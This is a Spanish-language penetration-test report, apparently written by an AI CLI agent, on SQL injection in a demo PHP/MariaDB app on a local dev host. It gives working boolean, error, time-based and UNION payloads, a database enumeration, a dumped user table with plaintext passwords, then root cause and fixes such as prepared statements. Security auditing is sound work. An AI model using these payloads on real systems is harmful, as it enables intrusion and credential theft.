# Informe de Auditoría de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30 15:01:22  
**Analista:** GitHub Copilot CLI  

---

## 1. Resumen Ejecutivo

Se identificó y explotó una vulnerabilidad **SQL Injection clásica (error-based, boolean-based, time-based y UNION-based)** en el parámetro `id` del formulario de búsqueda de usuarios. La explotación permitió obtener acceso completo a la base de datos `sqli_demo`, incluyendo credenciales en texto plano de 8 usuarios.

**Severidad:** 🔴 **CRÍTICA**

---

## 2. Descripción del Objetivo

| Campo | Valor |
|-------|-------|
| URL | http://web.dev.local:8083/ |
| Tecnología | PHP 8.1.33, Apache 2.4.65 |
| Base de datos | MariaDB 10.11.14 |
| OS servidor | Linux Debian |
| Parámetro vulnerable | `id` (GET) |

La aplicación presenta un formulario de búsqueda de usuarios por ID (`User ID`), cuyo valor se inserta directamente en una consulta SQL sin sanitización.

---

## 3. Vulnerabilidades Encontradas

### 3.1 SQL Injection en parámetro `id`

**Tipo:** SQL Injection (múltiples técnicas)  
**Severidad:** CRÍTICA (CVSS 9.8)  
**Parámetro:** `id` (método GET)

#### Evidencia de vulnerabilidad

La inserción de una comilla simple (`'`) en el parámetro `id` provoca un error SQL visible:

**Request:**
```
GET /?id=1'&Submit=Submit HTTP/1.1
Host: web.dev.local:8083
```

**Response (error expuesto):**
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right syntax 
to use near ''1''' at line 1 in /var/www/html/low.php:11
#0 /var/www/html/low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
```

Este error confirma:
- La aplicación NO usa consultas preparadas (prepared statements)
- La ruta del archivo vulnerable: `/var/www/html/low.php`
- El input se inserta directamente en la query SQL

#### Técnicas de inyección confirmadas

| Técnica | Payload |
|---------|---------|
| Boolean-based blind | `id=1' OR NOT 9498=9498#` |
| Error-based | `id=1' AND EXTRACTVALUE(4916,CONCAT(0x5c,...))-- XbML` |
| Time-based blind | `id=1' AND (SELECT 9954 FROM (SELECT(SLEEP(5)))VhDO)-- ciFu` |
| UNION query | `id=1' UNION ALL SELECT NULL,CONCAT(...)#` |

---

## 4. Explotación

### 4.1 Enumeración de bases de datos

Mediante UNION injection se enumeraron las bases de datos disponibles:

```
available databases [5]:
  [*] information_schema
  [*] mysql
  [*] performance_schema
  [*] sqli_demo
  [*] sys
```

El usuario de base de datos es: `root@172.18.0.3` — con privilegios máximos.

### 4.2 Extracción de datos - Tabla `sqli_demo.users`

Se volcó completamente la tabla de usuarios con credenciales en texto plano:

| user_id | username  | first_name | last_name | email               | password    |
|---------|-----------|------------|-----------|---------------------|-------------|
| 1       | admin     | John       | Doe       | admin@example.com   | password123 |
| 2       | jsmith    | Jane       | Smith     | jane@example.com    | secret456   |
| 3       | bjohnson  | Bob        | Johnson   | bob@example.com     | mypass789   |
| 4       | awilliams | Alice      | Williams  | alice@example.com   | qwerty123   |
| 5       | cbrown    | Charlie    | Brown     | charlie@example.com | password    |
| 6       | ddavis    | Diana      | Davis     | diana@example.com   | secure123   |
| 7       | emiller   | Eve        | Miller    | eve@example.com     | hackme      |
| 8       | fwilson   | Frank      | Wilson    | frank@example.com   | admin123    |

### 4.3 Payload UNION manual confirmado

```
GET /?id=1' UNION ALL SELECT NULL,CONCAT(user(),0x3a,database(),0x3a,version())#&Submit=Submit
```

**Resultado:**
```
Surname: root@172.18.0.3:sqli_demo:10.11.14-MariaDB-ubu2204
```

---

## 5. Impacto

- **Confidencialidad:** ALTO — Se exponen todos los datos de usuarios, incluyendo contraseñas en texto plano
- **Integridad:** ALTO — Es posible modificar/eliminar datos en la base de datos
- **Disponibilidad:** ALTO — El usuario `root` podría borrar tablas o la base de datos
- **Movimiento lateral:** ALTO — Con acceso `root` a MariaDB, es posible leer archivos del sistema (`LOAD_FILE`) y potencialmente escribir webshells (`INTO OUTFILE`)

---

## 6. Causa Raíz

El código en `/var/www/html/low.php` construye la query SQL concatenando directamente el input del usuario:

```php
// Código vulnerable (inferido del comportamiento)
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
mysqli_query($conn, $query);
```

No se aplica ninguna de las siguientes medidas de protección:
- Consultas preparadas (prepared statements)
- Escape de caracteres especiales
- Validación de tipo de dato
- WAF o filtrado de input

---

## 7. Recomendaciones

### Inmediatas (Críticas)
1. **Usar Prepared Statements** - Reemplazar la query vulnerable:
   ```php
   $stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```
2. **Cambiar todas las contraseñas** expuestas inmediatamente
3. **Hashear contraseñas** — nunca almacenarlas en texto plano (usar `password_hash()` con bcrypt)
4. **Desactivar mensajes de error en producción** — usar `display_errors = Off` en `php.ini`

### A corto plazo
5. **Validar y sanitizar todos los inputs** — validar que `id` sea un entero positivo
6. **Principio de mínimo privilegio** — La aplicación no debería conectarse como `root`; crear un usuario con permisos limitados (SELECT únicamente)
7. **Implementar WAF** — Para detectar y bloquear payloads de inyección SQL

### A largo plazo
8. **Auditoría de código completa** — Revisar todas las consultas SQL en la aplicación
9. **Implementar SAST** en el pipeline de CI/CD para detectar vulnerabilidades automáticamente
10. **Formación en seguridad** para el equipo de desarrollo (OWASP Top 10)

---

## 8. Referencias

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
- [OWASP Testing Guide - SQL Injection](https://owasp.org/www-project-web-security-testing-guide/)

---

*Informe generado automáticamente durante auditoría autorizada.*
